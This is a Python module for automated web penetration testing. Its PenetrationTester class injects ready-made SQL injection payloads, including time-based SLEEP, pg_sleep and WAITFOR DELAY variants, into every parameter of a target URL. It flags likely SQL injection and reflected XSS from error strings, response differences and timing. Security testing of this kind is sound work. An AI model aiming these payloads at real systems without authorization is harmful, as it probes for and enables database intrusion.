"""
Production-ready penetration testing automation helpers.

Features:
- Send SQL injection payloads against HTTP parameters.
- Detect reflected XSS from HTTP responses.
- Compare baseline and injected responses for anomalies.
- Detect time-based blind SQL injection.
"""

from __future__ import annotations

import hashlib
import html
import logging
import time
import urllib.parse
from dataclasses import dataclass
from difflib import SequenceMatcher
from typing import Any, Dict, Iterable, List, Mapping, Optional

import requests

LOG = logging.getLogger(__name__)

DEFAULT_SQLI_PAYLOADS: List[str] = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR 1=1--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "' UNION SELECT NULL--",
    "') OR ('1'='1",
]

DEFAULT_TIME_BASED_PAYLOADS: List[str] = [
    "' AND SLEEP(5)--",  # MySQL
    '" AND SLEEP(5)--',
    "' AND pg_sleep(5)--",  # PostgreSQL
    "'; WAITFOR DELAY '0:0:5'--",  # MSSQL
]

SQL_ERROR_PATTERNS: List[str] = [
    "sql syntax",
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "mysql_fetch",
    "pg_query",
    "odbc sql",
    "sqlstate",
    "syntax error at or near",
    "warning: sqlite",
]


@dataclass(frozen=True)
class ResponseSnapshot:
    """Baseline snapshot used for response comparison."""

    status_code: int
    response_time: float
    content_length: int
    body_hash: str
    body_preview: str

    @classmethod
    def from_response(cls, response: requests.Response, response_time: float, preview_size: int = 1000) -> "ResponseSnapshot":
        body = response.text or ""
        return cls(
            status_code=response.status_code,
            response_time=response_time,
            content_length=len(body),
            body_hash=hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest(),
            body_preview=body[:preview_size],
        )


@dataclass(frozen=True)
class ResponseComparison:
    """Differences between baseline and injected response."""

    status_code_changed: bool
    content_length_delta: int
    similarity_ratio: float
    response_time_delta: float
    hash_changed: bool
    sql_error_detected: bool


@dataclass(frozen=True)
class SQLInjectionResult:
    """Result for one SQLi payload execution."""

    parameter: str
    payload: str
    reflected_xss: bool
    likely_sqli: bool
    response_time: float
    comparison: ResponseComparison


@dataclass(frozen=True)
class TimeBasedSQLiResult:
    """Result for one time-based blind SQLi test."""

    parameter: str
    payload: str
    average_baseline_time: float
    average_injected_time: float
    delay_delta: float
    likely_vulnerable: bool


class PenetrationTester:
    """
    Modular HTTP testing helper for SQLi and reflected XSS checks.

    This module is intended for authorized testing only.
    """

    def __init__(self, timeout: int = 10, session: Optional[requests.Session] = None) -> None:
        self.timeout = timeout
        self.session = session or requests.Session()

    def capture_baseline(
        self,
        url: str,
        params: Optional[Mapping[str, Any]] = None,
        method: str = "GET",
        data: Optional[Mapping[str, Any]] = None,
        headers: Optional[Mapping[str, str]] = None,
    ) -> ResponseSnapshot:
        """Capture baseline response for later comparison."""
        response, elapsed = self._send_request(
            url=url,
            method=method,
            params=params,
            data=data,
            headers=headers,
        )
        return ResponseSnapshot.from_response(response, elapsed)

    def send_sqli_payloads(
        self,
        url: str,
        params: Mapping[str, Any],
        method: str = "GET",
        headers: Optional[Mapping[str, str]] = None,
        payloads: Optional[Iterable[str]] = None,
    ) -> List[SQLInjectionResult]:
        """Inject SQLi payloads into each parameter and compare with baseline."""
        chosen_payloads = list(payloads or DEFAULT_SQLI_PAYLOADS)
        if not params:
            return []

        baseline = self.capture_baseline(url=url, params=params, method=method, headers=headers)
        results: List[SQLInjectionResult] = []

        for parameter in params.keys():
            for payload in chosen_payloads:
                injected_params = self._inject_param(params, parameter, payload)
                response, elapsed = self._send_request(
                    url=url,
                    method=method,
                    params=injected_params,
                    headers=headers,
                )

                comparison = self.compare_baseline_with_response(baseline, response, elapsed)
                reflected_xss = self.detect_reflected_xss(response.text, payload)

                likely_sqli = (
                    comparison.sql_error_detected
                    or comparison.status_code_changed
                    or comparison.similarity_ratio < 0.75
                )

                results.append(
                    SQLInjectionResult(
                        parameter=parameter,
                        payload=payload,
                        reflected_xss=reflected_xss,
                        likely_sqli=likely_sqli,
                        response_time=elapsed,
                        comparison=comparison,
                    )
                )

        return results

    def compare_baseline_with_response(
        self,
        baseline: ResponseSnapshot,
        response: requests.Response,
        response_time: float,
    ) -> ResponseComparison:
        """Compare baseline snapshot against a new HTTP response."""
        body = response.text or ""
        hash_now = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()

        similarity = SequenceMatcher(
            None,
            baseline.body_preview,
            body[: len(baseline.body_preview)],
        ).ratio()

        body_lower = body.lower()
        sql_error_detected = any(pattern in body_lower for pattern in SQL_ERROR_PATTERNS)

        return ResponseComparison(
            status_code_changed=response.status_code != baseline.status_code,
            content_length_delta=len(body) - baseline.content_length,
            similarity_ratio=similarity,
            response_time_delta=response_time - baseline.response_time,
            hash_changed=hash_now != baseline.body_hash,
            sql_error_detected=sql_error_detected,
        )

    def detect_reflected_xss(self, response_text: str, payload: str) -> bool:
        """Check whether payload appears reflected in the HTTP response body."""
        if not response_text or not payload:
            return False

        normalized_response = html.unescape(response_text)
        candidates = {
            payload,
            html.escape(payload),
            urllib.parse.quote(payload, safe=""),
            urllib.parse.unquote(payload),
        }

        return any(candidate and candidate in normalized_response for candidate in candidates)

    def detect_time_based_blind_sqli(
        self,
        url: str,
        params: Mapping[str, Any],
        method: str = "GET",
        headers: Optional[Mapping[str, str]] = None,
        payloads: Optional[Iterable[str]] = None,
        retries: int = 3,
        min_delay_delta: float = 3.0,
    ) -> List[TimeBasedSQLiResult]:
        """Detect potential time-based blind SQLi via repeated timing analysis."""
        chosen_payloads = list(payloads or DEFAULT_TIME_BASED_PAYLOADS)
        if not params:
            return []

        retries = max(1, retries)
        results: List[TimeBasedSQLiResult] = []

        for parameter in params.keys():
            baseline_times = []
            for _ in range(retries):
                _, elapsed = self._send_request(
                    url=url,
                    method=method,
                    params=params,
                    headers=headers,
                )
                baseline_times.append(elapsed)

            baseline_avg = sum(baseline_times) / len(baseline_times)

            for payload in chosen_payloads:
                injected_times = []
                injected_params = self._inject_param(params, parameter, payload)

                for _ in range(retries):
                    _, elapsed = self._send_request(
                        url=url,
                        method=method,
                        params=injected_params,
                        headers=headers,
                    )
                    injected_times.append(elapsed)

                injected_avg = sum(injected_times) / len(injected_times)
                delta = injected_avg - baseline_avg
                likely_vulnerable = delta >= min_delay_delta

                results.append(
                    TimeBasedSQLiResult(
                        parameter=parameter,
                        payload=payload,
                        average_baseline_time=baseline_avg,
                        average_injected_time=injected_avg,
                        delay_delta=delta,
                        likely_vulnerable=likely_vulnerable,
                    )
                )

        return results

    def _send_request(
        self,
        url: str,
        method: str,
        params: Optional[Mapping[str, Any]] = None,
        data: Optional[Mapping[str, Any]] = None,
        headers: Optional[Mapping[str, str]] = None,
    ) -> tuple[requests.Response, float]:
        method_upper = method.upper()
        start = time.perf_counter()

        if method_upper == "GET":
            response = self.session.get(url, params=params, headers=headers, timeout=self.timeout)
        elif method_upper == "POST":
            response = self.session.post(url, params=params, data=data or params, headers=headers, timeout=self.timeout)
        else:
            raise ValueError(f"Unsupported HTTP method: {method}")

        elapsed = time.perf_counter() - start
        LOG.debug("%s %s completed in %.3fs", method_upper, response.url, elapsed)
        return response, elapsed

    @staticmethod
    def _inject_param(params: Mapping[str, Any], key: str, payload: str) -> Dict[str, Any]:
        injected = dict(params)
        original = "" if key not in injected or injected[key] is None else str(injected[key])
        injected[key] = f"{original}{payload}"
        return injected


__all__ = [
    "PenetrationTester",
    "ResponseSnapshot",
    "ResponseComparison",
    "SQLInjectionResult",
    "TimeBasedSQLiResult",
    "DEFAULT_SQLI_PAYLOADS",
    "DEFAULT_TIME_BASED_PAYLOADS",
]
